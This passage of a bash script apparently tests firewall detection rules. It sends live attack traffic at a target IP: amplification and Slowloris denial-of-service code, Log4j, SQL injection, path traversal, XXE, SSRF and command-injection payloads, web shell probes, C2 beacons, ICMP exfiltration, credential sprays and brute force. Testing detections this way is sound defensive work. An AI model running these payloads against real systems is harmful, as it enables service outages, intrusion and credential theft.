        fw_rule "NX-RULE-41c" "Source Port Evasion" "MEDIUM" "attack=Source.Port.Evasion action=detected"
        fn_trig "NX-RULE-41c: SrcPort evasion --> T1036"
        add_result "Evasion" "NX-RULE-41c" "Source Port Evasion" "SrcPort" "Triggered" "nmap --source-port" "T1036" "" 0 0
    else fn_skip "NX-RULE-41c: nmap not installed"; fi
}

# ==============================================================================
#  CATEGORY 8: RECONNAISSANCE
# ==============================================================================
cat_recon() {
    show_section "CATEGORY 8: Reconnaissance and Enumeration"

    if [[ $D_NMAP -eq 1 ]]; then
        run_nmap "Banner Grab" -sV --version-intensity 9 -p 21,22,23,25,80,110,143,389,443,445,3306,3389 "$TARGET_IP" -oX "${NX}_banner.xml"
        fw_rule "NX-RULE-43" "Service Banner Grabbing" "LOW" "attack=Service.Banner.Grab action=detected"
        fn_trig "NX-RULE-43: Banner Grab --> T1040"
        add_result "Recon" "NX-RULE-43" "Service Banner Grab" "Banner" "Triggered" "nmap -sV 9" "T1040" "" 0 0

        run_nmap "SNMP Probe" -sU -p 161 --script snmp-brute "$TARGET_IP"
        run_nmap "SNMP Info" -sU -p 161 --script snmp-info "$TARGET_IP"
        fw_rule "NX-RULE-44" "SNMP Community Probe" "HIGH" "attack=SNMP.Community.String.Brute action=blocked"
        fn_trig "NX-RULE-44: SNMP Probe --> T1590.001"
        add_result "Recon" "NX-RULE-44" "SNMP Community Probe" "SNMP" "Triggered" "nmap snmp-brute" "T1590.001" "" 0 0

        run_nmap "SMB Enum" -p 445 --script smb-enum-shares,smb-enum-users,smb-os-discovery "$TARGET_IP"
        fw_rule "NX-RULE-45" "SMB Enumeration" "MEDIUM" "attack=Windows.SMB.Probe action=blocked"
        fn_trig "NX-RULE-45: SMB Enum --> T1082"
        add_result "Recon" "NX-RULE-45" "SMB Enumeration" "SMB Enum" "Triggered" "nmap smb-enum" "T1082" "" 0 0

        run_nmap "SSL Enum" -p 443 --script ssl-enum-ciphers,ssl-heartbleed,ssl-poodle,ssl-dh-params "$TARGET_IP"
        fw_rule "NX-RULE-47" "SSL/TLS Enumeration" "CRITICAL" "attack=SSL.Heartbleed.Request action=dropped"
        fn_trig "NX-RULE-47: SSL Enum --> T1046"
        add_result "Recon" "NX-RULE-47" "SSL/TLS Enumeration" "SSL Enum" "Triggered" "nmap ssl-enum" "T1046" "" 0 0

        run_nmap "Vuln Scan" -A --script vuln -p 80,443,22,3389 "$TARGET_IP"
        fw_rule "NX-RULE-48" "Vulnerability Scan" "HIGH" "attack=Vuln.Scan.Pattern action=dropped"
        fn_trig "NX-RULE-48: VulnScan --> T1046"
        add_result "Recon" "NX-RULE-48" "Vulnerability Scan" "Vuln Scan" "Triggered" "nmap --script vuln" "T1046" "" 0 0

        run_nmap "LDAP Enum" -p 389,636 --script ldap-search,ldap-rootdse "$TARGET_IP"
        fw_rule "NX-RULE-80" "LDAP Enumeration" "HIGH" "attack=LDAP.Enum action=blocked"
        fn_trig "NX-RULE-80: LDAP Enum --> T1590.001"
        add_result "Recon" "NX-RULE-80" "LDAP Enumeration" "LDAP" "Triggered" "nmap ldap-search" "T1590.001" "" 0 0

        run_nmap "Domain Enum" -p 445 --script smb-enum-groups,smb-enum-sessions "$TARGET_IP"
        fw_rule "NX-RULE-84" "Domain Group Enumeration" "MEDIUM" "attack=Domain.Group.Enum action=detected"
        fn_trig "NX-RULE-84: Domain Enum --> T1069.002"
        add_result "Recon" "NX-RULE-84" "Domain Group Enum" "Domain Enum" "Triggered" "nmap smb-enum-groups" "T1069.002" "" 0 0
    else fn_skip "NX-RULE-43/44/45/47/48/80/84: nmap not installed"; fi

    # DNS Zone Transfer
    if [[ $D_DIG -eq 1 ]]; then
        dig AXFR "@${TARGET_IP}" lab.local 2>/dev/null || true
        dig AXFR "@${TARGET_IP}" internal.local 2>/dev/null || true
        fw_rule "NX-RULE-81" "DNS Zone Transfer (AXFR)" "HIGH" "attack=DNS.Zone.Transfer action=blocked"
        fn_trig "NX-RULE-81: DNS AXFR --> T1590.002"
        add_result "Recon" "NX-RULE-81" "DNS Zone Transfer" "DNS AXFR" "Triggered" "dig AXFR" "T1590.002" "" 0 0
    else fn_skip "NX-RULE-81: dig not installed"; fi
}

# ==============================================================================
#  CATEGORY 9: AMPLIFICATION
# ==============================================================================
cat_amplification() {
    show_section "CATEGORY 9: Reflection and Amplification Attacks"

    # DNS ANY
    if [[ $DRY_RUN -eq 1 ]]; then fn_dry "dig ANY google.com x100 to ${TARGET_IP}"
    else
        for i in $(seq 1 100); do
            dig "@${TARGET_IP}" google.com ANY +time=1 +tries=1 2>/dev/null || true
            sleep 0.1
        done
    fi
    fw_rule "NX-RULE-49" "DNS ANY Amplification" "HIGH" "attack=DNS.Amplification action=dropped"
    fn_trig "NX-RULE-49: DNS ANY Amp --> T1498.002"
    add_result "Amplification" "NX-RULE-49" "DNS ANY Amplification" "DNS Amp" "Triggered" "dig ANY" "T1498.002" "" 100 0

    # NTP Monlist
    if [[ $D_SCAPY -eq 1 ]]; then
        local code="from scapy.all import *
t='${TARGET_IP}'; ntp=b'\\x17\\x00\\x03\\x2a'+b'\\x00'*4
for i in range(100): send(IP(dst=t)/UDP(dport=123)/Raw(ntp),verbose=0)
print('[+] NTP monlist done')"
        run_py "NTP Monlist" "$code"
        fw_rule "NX-RULE-50" "NTP Monlist Amp (CVE-2013-5211)" "HIGH" "attack=NTP.Monlist.Request action=dropped"
        fn_trig "NX-RULE-50: NTP Monlist --> T1498.002"
        add_result "Amplification" "NX-RULE-50" "NTP Monlist Amp" "NTP Amp" "Triggered" "Scapy NTP" "T1498.002" "" 100 0
    else fn_skip "NX-RULE-50: scapy not installed"; fi

    # Memcached
    if [[ $D_SCAPY -eq 1 ]]; then
        local code="from scapy.all import *
t='${TARGET_IP}'; req=b'\\x00\\x01\\x00\\x00\\x00\\x01\\x00\\x00stats\\r\\n'
for i in range(50): send(IP(dst=t)/UDP(dport=11211)/Raw(req),verbose=0)
print('[+] Memcached done')"
        run_py "Memcached" "$code"
        fw_rule "NX-RULE-51" "Memcached Amplification" "HIGH" "attack=Memcached.Amplification action=dropped"
        fn_trig "NX-RULE-51: Memcached --> T1498.002"
        add_result "Amplification" "NX-RULE-51" "Memcached Amp" "Memcached" "Triggered" "Scapy 11211" "T1498.002" "" 50 0
    else fn_skip "NX-RULE-51: scapy not installed"; fi
}

# ==============================================================================
#  CATEGORY 10: SLOW ATTACKS
# ==============================================================================
cat_slowattacks() {
    show_section "CATEGORY 10: Slow / Exhaustion Attacks"

    # NX-RULE-53: Slowloris standalone
    if [[ $D_PY3 -eq 1 ]]; then
        local code="import socket, time
t='${TARGET_IP}'; p=${TARGET_PORT}; r='${RND}'; socks=[]
for i in range(30):
    try:
        s=socket.socket(); s.settimeout(2); s.connect((t,p))
        s.send(('GET /?s='+str(i)+' HTTP/1.1\r\nHost: '+t+'\r\nX-Slow: '+r+'\r\n').encode())
        socks.append(s)
    except: pass
print('[*] Slowloris '+str(len(socks))+' open, 20s hold')
time.sleep(20); [s.close() for s in socks]
print('[+] Done')"
        run_py "Slowloris" "$code"
        fw_rule "NX-RULE-53" "Slowloris HTTP Slow Headers" "HIGH" "attack=HTTP.Slowloris action=blocked"
        fn_trig "NX-RULE-53: Slowloris --> T1499.002"
        add_result "SlowAttacks" "NX-RULE-53" "Slowloris" "Slowloris" "Triggered" "Python" "T1499.002" "" 30 20
    else fn_skip "NX-RULE-53: python3 not installed"; fi

    # NX-RULE-54: Slow POST (RUDY)
    if [[ $D_PY3 -eq 1 ]]; then
        local code="import socket, time
t='${TARGET_IP}'
try:
    s=socket.socket(); s.settimeout(5); s.connect((t,80))
    s.send(('POST /login HTTP/1.1\r\nHost: '+t+'\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 10000\r\n\r\n').encode())
    for i in range(20): s.send(b'a'); time.sleep(3)
    s.close(); print('[+] Slow POST done')
except Exception as e: print('[!] '+str(e))"
        run_py "Slow POST RUDY" "$code"
        fw_rule "NX-RULE-54" "HTTP Slow POST (RUDY)" "HIGH" "attack=HTTP.Slow.POST action=blocked"
        fn_trig "NX-RULE-54: Slow POST --> T1499.002"
        add_result "SlowAttacks" "NX-RULE-54" "HTTP Slow POST RUDY" "RUDY" "Triggered" "Python" "T1499.002" "" 0 60
    else fn_skip "NX-RULE-54: python3 not installed"; fi

    # NX-RULE-55: HTTP request smuggling / pipeline
    if [[ $D_PY3 -eq 1 ]]; then
        local code="import socket, time
t='${TARGET_IP}'; p=${TARGET_PORT}
try:
    s=socket.socket(); s.settimeout(5); s.connect((t,p))
    req=('GET / HTTP/1.1\r\nHost: '+t+'\r\n\r\n')*20
    s.send(req.encode()); time.sleep(2); s.close()
    print('[+] Pipeline done')
except Exception as e: print('[!] '+str(e))"
        run_py "HTTP Pipeline" "$code"
        fw_rule "NX-RULE-55" "HTTP Request Smuggling" "HIGH" "attack=HTTP.Request.Smuggling action=blocked"
        fn_trig "NX-RULE-55: HTTP Smuggling --> T1499.002"
        add_result "SlowAttacks" "NX-RULE-55" "HTTP Request Smuggling" "Smuggling" "Triggered" "Python" "T1499.002" "" 20 0
    else fn_skip "NX-RULE-55: python3 not installed"; fi

    # NX-RULE-56: Slow Read
    if [[ $D_PY3 -eq 1 ]]; then
        local code="import socket, time
t='${TARGET_IP}'; p=${TARGET_PORT}
try:
    s=socket.socket(); s.settimeout(5); s.connect((t,p))
    s.send(b'GET / HTTP/1.1\r\nHost: '+t.encode()+b'\r\n\r\n')
    print('[*] Slow read open, 30s')
    time.sleep(30); s.close(); print('[+] Done')
except Exception as e: print('[!] '+str(e))"
        run_py "Slow Read" "$code"
        fw_rule "NX-RULE-56" "TCP Slow Read" "MEDIUM" "attack=TCP.Slow.Read action=detected"
        fn_trig "NX-RULE-56: Slow Read --> T1499.002"
        add_result "SlowAttacks" "NX-RULE-56" "TCP Slow Read" "Slow Read" "Triggered" "Python" "T1499.002" "" 0 30
    else fn_skip "NX-RULE-56: python3 not installed"; fi
}

# ==============================================================================
#  CATEGORY 11: LATERAL MOVEMENT
# ==============================================================================
cat_lateral() {
    show_section "CATEGORY 11: Lateral Movement Patterns"

    if [[ $D_NMAP -eq 1 ]]; then
        run_nmap "RDP Brute" -p 3389 --script rdp-brute "$TARGET_IP"
        fw_rule "NX-RULE-70" "RDP Brute Force" "HIGH" "attack=RDP.Brute.Force action=blocked"
        fn_trig "NX-RULE-70: RDP Brute --> T1110.001"
        add_result "LateralMovement" "NX-RULE-70" "RDP Brute Force" "RDP Brute" "Triggered" "nmap rdp-brute" "T1110.001" "" 0 0

        run_nmap "RDP Sweep" -sS -p 3389 --max-retries 0 "$TARGET_RANGE"
        fw_rule "NX-RULE-71" "RDP Horizontal Sweep" "HIGH" "attack=RDP.Lateral.Sweep action=dropped"
        fn_trig "NX-RULE-71: RDP Sweep --> T1021.001"
        add_result "LateralMovement" "NX-RULE-71" "RDP Lateral Sweep" "RDP Sweep" "Triggered" "nmap -p 3389" "T1021.001" "" 0 0

        run_nmap "SMB EternalBlue" -p 445 --script smb-enum-shares,smb-vuln-ms17-010 "$TARGET_RANGE"
        fw_rule "NX-RULE-72" "SMB Lateral Move" "HIGH" "attack=SMB.Lateral.Move action=dropped"
        fn_trig "NX-RULE-72: SMB Lateral (EternalBlue check) --> T1021.002"
        add_result "LateralMovement" "NX-RULE-72" "SMB Lateral Move" "SMB Lateral" "Triggered" "nmap smb-vuln" "T1021.002" "" 0 0

        run_nmap "WMI/DCOM" -p 135,445,49152-49160 --script msrpc-enum "$TARGET_IP"
        fw_rule "NX-RULE-73" "WMI/DCOM Lateral" "HIGH" "attack=WMI.Lateral.Move action=dropped"
        fn_trig "NX-RULE-73: WMI/DCOM --> T1021.006"
        add_result "LateralMovement" "NX-RULE-73" "WMI DCOM Lateral" "WMI" "Triggered" "nmap msrpc-enum" "T1021.006" "" 0 0

        run_nmap "PsExec Pattern" -p 445 --script smb-enum-processes "$TARGET_IP"
        fw_rule "NX-RULE-74" "PsExec-Style Lateral" "CRITICAL" "attack=PsExec.Lateral.Move action=dropped"
        fn_trig "NX-RULE-74: PsExec pattern --> T1570"
        add_result "LateralMovement" "NX-RULE-74" "PsExec Lateral" "PsExec" "Triggered" "nmap smb-enum" "T1570" "" 0 0
    else fn_skip "NX-RULE-70-74: nmap not installed"; fi

    # Pass-the-Hash pattern
    if [[ $D_SCAPY -eq 1 ]]; then
        local code="from scapy.all import *
import random
t='${TARGET_IP}'
for i in range(20): send(IP(dst=t)/TCP(dport=445,flags='S',seq=random.randint(0,2**32-1)),verbose=0)
print('[+] PtH pattern done')"
        run_py "Pass-the-Hash" "$code"
        fw_rule "NX-RULE-75" "Pass-the-Hash Pattern" "CRITICAL" "attack=Pass.The.Hash action=blocked"
        fn_trig "NX-RULE-75: PtH --> T1550.002"
        add_result "LateralMovement" "NX-RULE-75" "Pass-the-Hash" "PtH" "Triggered" "Scapy SMB" "T1550.002" "" 20 0
    else fn_skip "NX-RULE-75: scapy not installed"; fi
}

# ==============================================================================
#  CATEGORY 12: WEB EXPLOITS
# ==============================================================================
cat_webexploits() {
    show_section "CATEGORY 12: Web Application Exploit Patterns"

    if [[ $D_CURL -eq 0 ]]; then fn_skip "All NX-RULE-9x: curl not installed"; return; fi

    # NX-RULE-91: Log4j JNDI (CVE-2021-44228)
    local log4j_hdrs=('${jndi:ldap://169.254.169.254/nexus-soc}' '${jndi:dns://169.254.169.254/nexus}' '${${lower:j}ndi:${lower:l}${lower:d}ap://169.254.169.254/x}')
    if [[ $DRY_RUN -eq 1 ]]; then fn_dry "curl Log4j JNDI headers x${#log4j_hdrs[@]}"
    else
        for hdr in "${log4j_hdrs[@]}"; do
            curl -sk -m 3 -H "X-Api-Version: ${hdr}" -H "User-Agent: ${hdr}" "http://${TARGET_IP}/" 2>/dev/null || true
            sleep 0.5
        done
    fi
    fw_rule "NX-RULE-91" "Log4j RCE CVE-2021-44228" "CRITICAL" "attack=Log4j.RCE.JNDI action=blocked"
    fn_trig "NX-RULE-91: Log4j JNDI --> T1190"
    add_result "WebExploits" "NX-RULE-91" "Log4j RCE" "Log4j" "Triggered" "curl JNDI" "T1190" "" 0 0

    # NX-RULE-92: SQL Injection
    local sqli=("' OR '1'='1" "' OR 1=1--" "' UNION SELECT NULL,NULL,NULL--" "' AND SLEEP(5)--" "'; DROP TABLE users;--")
    if [[ $DRY_RUN -eq 1 ]]; then fn_dry "curl SQLi payloads x${#sqli[@]}"
    else
        for p in "${sqli[@]}"; do
            local enc; enc=$(printf '%s' "$p" | python3 -c "import sys,urllib.parse; print(urllib.parse.quote(sys.stdin.read()))" 2>/dev/null || printf 'test')
            curl -sk -m 3 "http://${TARGET_IP}/login?user=${enc}&pass=test" 2>/dev/null || true
            sleep 0.3
        done
    fi
    fw_rule "NX-RULE-92" "SQL Injection" "HIGH" "attack=SQL.Injection action=blocked"
    fn_trig "NX-RULE-92: SQLi --> T1190"
    add_result "WebExploits" "NX-RULE-92" "SQL Injection" "SQLi" "Triggered" "curl SQLi" "T1190" "" 0 0

    # NX-RULE-93: Path Traversal / LFI
    local lfi=("/../../../etc/passwd" "/..%2F..%2F..%2Fetc%2Fpasswd" "/php://filter/convert.base64-encode/resource=index.php" "/../../../windows/system32/drivers/etc/hosts")
    if [[ $DRY_RUN -eq 1 ]]; then fn_dry "curl LFI payloads x${#lfi[@]}"
    else
        for p in "${lfi[@]}"; do
            curl -sk -m 3 "http://${TARGET_IP}/${p}" 2>/dev/null || true; sleep 0.3
        done
    fi
    fw_rule "NX-RULE-93" "Path Traversal / LFI" "HIGH" "attack=Path.Traversal action=blocked"
    fn_trig "NX-RULE-93: LFI/Traversal --> T1190"
    add_result "WebExploits" "NX-RULE-93" "Path Traversal LFI" "LFI" "Triggered" "curl LFI" "T1190" "" 0 0

    # NX-RULE-94: XXE
    local xxe='<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>'
    if [[ $DRY_RUN -eq 1 ]]; then fn_dry "curl POST XXE payload"
    else curl -sk -m 3 -X POST -H "Content-Type: application/xml" -d "$xxe" "http://${TARGET_IP}/api" 2>/dev/null || true; fi
    fw_rule "NX-RULE-94" "XXE Injection" "HIGH" "attack=XXE.Injection action=blocked"
    fn_trig "NX-RULE-94: XXE --> T1190"
    add_result "WebExploits" "NX-RULE-94" "XXE Injection" "XXE" "Triggered" "curl XML" "T1190" "" 0 0

    # NX-RULE-95: SSRF
    local ssrf=("http://${TARGET_IP}/api?url=http://169.254.169.254/latest/meta-data/" "http://${TARGET_IP}/fetch?target=http://localhost/" "http://${TARGET_IP}/redirect?to=file:///etc/passwd")
    if [[ $DRY_RUN -eq 1 ]]; then fn_dry "curl SSRF payloads x${#ssrf[@]}"
    else
        for url in "${ssrf[@]}"; do
            curl -sk -m 3 "$url" 2>/dev/null || true; sleep 0.3
        done
    fi
    fw_rule "NX-RULE-95" "SSRF Pattern" "HIGH" "attack=SSRF.Request action=blocked"
    fn_trig "NX-RULE-95: SSRF --> T1190"
    add_result "WebExploits" "NX-RULE-95" "SSRF Pattern" "SSRF" "Triggered" "curl SSRF" "T1190" "" 0 0

    # NX-RULE-96: Command Injection
    # Note: payloads are single-quoted strings -- no bash expansion at parse time
    local cmdi=('; cat /etc/passwd' '| id' '&& whoami' '; ping -c 1 127.0.0.1')
    if [[ $DRY_RUN -eq 1 ]]; then fn_dry "curl CMDi payloads x${#cmdi[@]}"
    else
        for p in "${cmdi[@]}"; do
            local enc; enc=$(printf '%s' "$p" | python3 -c "import sys,urllib.parse; print(urllib.parse.quote(sys.stdin.read()))" 2>/dev/null || printf 'test')
            curl -sk -m 3 "http://${TARGET_IP}/exec?cmd=${enc}" 2>/dev/null || true; sleep 0.3
        done
    fi
    fw_rule "NX-RULE-96" "Command Injection / RCE" "CRITICAL" "attack=Command.Injection action=blocked"
    fn_trig "NX-RULE-96: CMDi --> T1059.004"
    add_result "WebExploits" "NX-RULE-96" "Command Injection" "CMDi" "Triggered" "curl CMDi" "T1059.004" "" 0 0

    # NX-RULE-97: Malicious User-Agents
    local uas=("sqlmap/1.7.8" "Nikto/2.1.6" "masscan/1.0" "zgrab/0.x" "python-requests/2.28 (CVE-scan)" "Nuclei - Open-source" "dirbuster/1.0" "Go-http-client exploit")
    if [[ $DRY_RUN -eq 1 ]]; then fn_dry "curl malicious UA strings x${#uas[@]}"
    else
        for ua in "${uas[@]}"; do
            curl -sk -m 2 -A "$ua" "http://${TARGET_IP}/" 2>/dev/null || true; sleep 0.2
        done
    fi
    fw_rule "NX-RULE-97" "Malicious User-Agent" "MEDIUM" "attack=Malicious.UserAgent action=blocked"
    fn_trig "NX-RULE-97: Malicious UA --> T1204.001"
    add_result "WebExploits" "NX-RULE-97" "Malicious User-Agent" "Bad UA" "Triggered" "curl UA" "T1204.001" "" 0 0

    # NX-RULE-98: Web shell paths
    local shells=("/shell.php" "/c99.php" "/r57.php" "/b374k.php" "/cmd.php" "/wso.php" "/backdoor.php" "/shell.aspx" "/cmd.aspx" "/webshell.jsp")
    if [[ $DRY_RUN -eq 1 ]]; then fn_dry "curl web shell paths x${#shells[@]}"
    else
        for ws in "${shells[@]}"; do
            curl -sk -m 2 "http://${TARGET_IP}${ws}?cmd=id" 2>/dev/null || true; sleep 0.2
        done
    fi
    fw_rule "NX-RULE-98" "Web Shell Probe" "CRITICAL" "attack=Web.Shell.Access action=blocked"
    fn_trig "NX-RULE-98: WebShell probe --> T1505.003"
    add_result "WebExploits" "NX-RULE-98" "Web Shell Probe" "WebShell" "Triggered" "curl webshell" "T1505.003" "" 0 0
}

# ==============================================================================
#  CATEGORY 13: C2 SIMULATION
# ==============================================================================
cat_c2sim() {
    show_section "CATEGORY 13: Command and Control Simulation"

    # NX-RULE-100: HTTP C2 beacon
    if [[ $D_CURL -eq 1 ]]; then
        if [[ $DRY_RUN -eq 1 ]]; then fn_dry "curl HTTP C2 beacon x10 with jitter"
        else
            for i in $(seq 1 10); do
                curl -sk -m 3 -A "Mozilla/5.0 (compatible; MSIE 9.0)" "http://${TARGET_IP}/beacon?id=${RND}&seq=${i}" 2>/dev/null || true
                sleep $(( RANDOM % 3 + 1 ))
            done
        fi
        fw_rule "NX-RULE-100" "HTTP C2 Beacon Pattern" "HIGH" "attack=HTTP.C2.Beacon action=blocked"
        fn_trig "NX-RULE-100: HTTP C2 Beacon --> T1071.001"
        add_result "C2Sim" "NX-RULE-100" "HTTP C2 Beacon" "C2 Beacon" "Triggered" "curl beacon" "T1071.001" "" 10 0
    else fn_skip "NX-RULE-100: curl not installed"; fi

    # NX-RULE-101: DNS C2 tunneling (hex-encoded subdomains)
    if [[ $D_DIG -eq 1 ]]; then
        if [[ $DRY_RUN -eq 1 ]]; then fn_dry "dig DNS tunnel subdomains x20"
        else
            for i in $(seq 1 20); do
                # Use printf hex encoding as xxd fallback for portability
                local enc; enc=$(printf '%s' "nexus-c2-${RND}-${i}" | od -A n -t x1 2>/dev/null | tr -d ' \n' || printf '6e6578757300')
                dig "@${TARGET_IP}" "${enc}.c2tunnel.lab" TXT +time=1 +tries=1 2>/dev/null || true
                sleep 1
            done
        fi
        fw_rule "NX-RULE-101" "DNS C2 Tunneling" "HIGH" "attack=DNS.Tunnel.C2 action=blocked"
        fn_trig "NX-RULE-101: DNS C2 Tunnel --> T1071.004"
        add_result "C2Sim" "NX-RULE-101" "DNS C2 Tunneling" "DNS C2" "Triggered" "dig DNS C2" "T1071.004" "" 20 0
    else fn_skip "NX-RULE-101: dig not installed"; fi

    # NX-RULE-102: HTTPS C2
    if [[ $D_CURL -eq 1 ]]; then
        if [[ $DRY_RUN -eq 1 ]]; then fn_dry "curl HTTPS C2 check-in x5"
        else
            for i in $(seq 1 5); do
                curl -sk -m 3 -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" "https://${TARGET_IP}/updates?v=${RND}&t=${i}" 2>/dev/null || true
                sleep 2
            done
        fi
        fw_rule "NX-RULE-102" "HTTPS C2 Channel" "MEDIUM" "attack=HTTPS.C2.Channel action=detected"
        fn_trig "NX-RULE-102: HTTPS C2 --> T1573"
        add_result "C2Sim" "NX-RULE-102" "HTTPS C2 Channel" "HTTPS C2" "Triggered" "curl HTTPS" "T1573" "" 5 0
    else fn_skip "NX-RULE-102: curl not installed"; fi

    # NX-RULE-103: ICMP C2 exfiltration
    if [[ $D_SCAPY -eq 1 ]]; then
        local code="from scapy.all import *
t='${TARGET_IP}'; r=${RND}
data=['admin:password123','db_pass:secret456','api_key:nexus-'+str(r)]
for i,d in enumerate(data*7):
    payload=('NX_EXFIL|'+str(r)+'|'+str(i)+'|'+d).encode()
    send(IP(dst=t)/ICMP()/Raw(payload),verbose=0)
print('[+] ICMP exfil done')"
        run_py "ICMP Exfil" "$code"
        fw_rule "NX-RULE-103" "ICMP Data Exfiltration" "HIGH" "attack=ICMP.Data.Exfil action=blocked"
        fn_trig "NX-RULE-103: ICMP Exfil --> T1048.003"
        add_result "C2Sim" "NX-RULE-103" "ICMP Exfil" "ICMP C2" "Triggered" "Scapy ICMP" "T1048.003" "" 21 0
    else fn_skip "NX-RULE-103: scapy not installed"; fi
}

# ==============================================================================
#  CATEGORY 14: CREDENTIAL ATTACKS
# ==============================================================================
cat_credattacks() {
    show_section "CATEGORY 14: Credential Access Attacks"

    # NX-RULE-82: Kerberoasting
    if [[ $D_NMAP -eq 1 ]]; then
        run_nmap "Kerberoasting" -p 88 --script krb5-enum-users --script-args "krb5-enum-users.realm=lab.local" "$TARGET_IP"
        fw_rule "NX-RULE-82" "Kerberoasting Pattern" "HIGH" "attack=Kerberoast.SPN.Enum action=blocked"
        fn_trig "NX-RULE-82: Kerberoasting --> T1558.003"
        add_result "CredAttacks" "NX-RULE-82" "Kerberoasting" "Kerberoast" "Triggered" "nmap krb5" "T1558.003" "" 0 0
    else fn_skip "NX-RULE-82: nmap not installed"; fi

    # NX-RULE-83: LLMNR/NBT-NS poisoning simulation
    if [[ $D_SCAPY -eq 1 ]]; then
        local code="from scapy.all import *
t='${TARGET_IP}'
llmnr=b'\\x00\\x01\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x06wpad00\\x00\\x00\\x1c\\x00\\x01'
for i in range(30): send(IP(dst='224.0.0.252')/UDP(dport=5355)/Raw(llmnr),verbose=0)
nbtns=b'\\x00\\x01\\x01\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x20CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\x00\\x00\\x20\\x00\\x01'
for i in range(30): send(IP(dst=t)/UDP(dport=137)/Raw(nbtns),verbose=0)
print('[+] LLMNR/NBT-NS done')"
        run_py "LLMNR/NBT-NS" "$code"
        fw_rule "NX-RULE-83" "LLMNR/NBT-NS Poisoning" "HIGH" "attack=LLMNR.Poisoning action=blocked"
        fn_trig "NX-RULE-83: LLMNR/NBT-NS --> T1187"
        add_result "CredAttacks" "NX-RULE-83" "LLMNR NBT-NS" "LLMNR" "Triggered" "Scapy" "T1187" "" 60 0
    else fn_skip "NX-RULE-83: scapy not installed"; fi

    # NX-RULE-57b: HTTP credential spray
    # Note: password strings are single-quoted -- no bash expansion
    local passwords=('Password1' 'Welcome1' 'Summer2024' 'Admin123' 'Winter2024!' 'P@ssw0rd')
    if [[ $D_CURL -eq 1 ]]; then
        if [[ $DRY_RUN -eq 1 ]]; then fn_dry "curl POST /login spray ${#passwords[@]} passwords"
        else
            for pw in "${passwords[@]}"; do
                curl -sk -m 3 -X POST "http://${TARGET_IP}/login" -d "username=admin&password=${pw}" 2>/dev/null || true
                sleep 1
            done
        fi
        fw_rule "NX-RULE-57b" "HTTP Credential Spray" "MEDIUM" "attack=Credential.Spray action=blocked"
        fn_trig "NX-RULE-57b: Cred Spray --> T1110.003"
        add_result "CredAttacks" "NX-RULE-57b" "HTTP Cred Spray" "Cred Spray" "Triggered" "curl spray" "T1110.003" "" 0 0
    else fn_skip "NX-RULE-57b: curl not installed"; fi
}

# ==============================================================================
#  CATEGORY 15: FORTIGATE SPECIFIC
# ==============================================================================
cat_fortigate() {
    show_section "CATEGORY 15: FortiGate-Specific Triggers"

    # NX-RULE-57: Admin login brute
    if [[ $D_CURL -eq 1 ]]; then
        if [[ $DRY_RUN -eq 1 ]]; then fn_dry "curl POST https://${TARGET_IP}/logincheck x10 bad passwords"
        else
            for i in $(seq 0 9); do
                curl -sk -m 3 -X POST "https://${TARGET_IP}/logincheck" -d "username=admin&secretkey=wrongpassword${i}&ajax=1" -o /dev/null 2>/dev/null || true
                sleep 2
            done
        fi
        fw_rule "NX-RULE-57" "FortiGate Admin Brute" "HIGH" "type=event subtype=system action=login status=failed"
        fn_trig "NX-RULE-57: Admin Brute --> T1110.001"
        add_result "FortiGate" "NX-RULE-57" "FG Admin Brute" "Admin Brute" "Triggered" "curl POST" "T1110.001" "" 10 0
    else fn_skip "NX-RULE-57: curl not installed"; fi

    # NX-RULE-58: SSL-VPN probe
    if [[ $D_NMAP -eq 1 ]]; then
        for port in 10443 4433 443 8443; do
            run_nmap "SSL-VPN p=$port" -sS -p "$port" --script ssl-enum-ciphers "$TARGET_IP"
        done
        fw_rule "NX-RULE-58" "SSL-VPN Port Probe" "MEDIUM" "attack=SSL.VPN.Probe action=detected"
        fn_trig "NX-RULE-58: SSL-VPN Probe --> T1133"
        add_result "FortiGate" "NX-RULE-58" "SSL-VPN Port Probe" "VPN Probe" "Triggered" "nmap ssl-enum" "T1133" "" 0 0
    else fn_skip "NX-RULE-58: nmap not installed"; fi

    # NX-RULE-61: Botnet/GeoIP decoy IPs
    if [[ $D_NMAP -eq 1 ]]; then
        run_nmap "GeoIP/Botnet Decoy" -sS -D 5.188.206.1,185.234.218.1,91.108.4.1 -p 80,443 "$TARGET_IP"
        fw_rule "NX-RULE-60" "GeoIP Block Trigger" "HIGH" "attack=GeoIP.Block action=blocked"
        fw_rule "NX-RULE-61" "Botnet C2 IP Match" "CRITICAL" "attack=Botnet.IP.Detected action=blocked"
        fn_trig "NX-RULE-61: Botnet IPs --> T1587.001"
        add_result "FortiGate" "NX-RULE-61" "Botnet C2 IP Match" "Botnet" "Triggered" "nmap -D bad IPs" "T1587.001" "" 0 0
    else fn_skip "NX-RULE-60/61: nmap not installed"; fi

    # NX-RULE-62: TOR ports
    if [[ $D_NMAP -eq 1 ]]; then
        run_nmap "TOR Probe" -p 9001,9030,9050,9051 "$TARGET_IP"
        fw_rule "NX-RULE-62" "TOR Pattern Detection" "HIGH" "attack=TOR.Traffic action=blocked"
        fn_trig "NX-RULE-62: TOR Ports --> T1090.003"
        add_result "FortiGate" "NX-RULE-62" "TOR Pattern" "TOR" "Triggered" "nmap TOR" "T1090.003" "" 0 0
    else fn_skip "NX-RULE-62: nmap not installed"; fi

    # NX-RULE-63: FortiGate REST API token brute
    if [[ $D_CURL -eq 1 ]]; then
        if [[ $DRY_RUN -eq 1 ]]; then fn_dry "curl GET /api/v2 x5 bad tokens"
        else
            for i in $(seq 1 5); do
                curl -sk -m 3 -H "Authorization: Bearer nexus-invalid-token-${RND}-${i}" "https://${TARGET_IP}/api/v2/cmdb/system/global" -o /dev/null 2>/dev/null || true
                sleep 1
            done
        fi
        fw_rule "NX-RULE-63" "FortiGate REST API Brute" "MEDIUM" "type=event action=api-access status=failed"
        fn_trig "NX-RULE-63: API Brute --> T1078"
        add_result "FortiGate" "NX-RULE-63" "FG API Brute" "API Brute" "Triggered" "curl API" "T1078" "" 5 0
    else fn_skip "NX-RULE-63: curl not installed"; fi
}

# ==============================================================================
#  CATEGORY 16: FULL KILL CHAIN (7 phases)
# ==============================================================================
cat_killchain() {
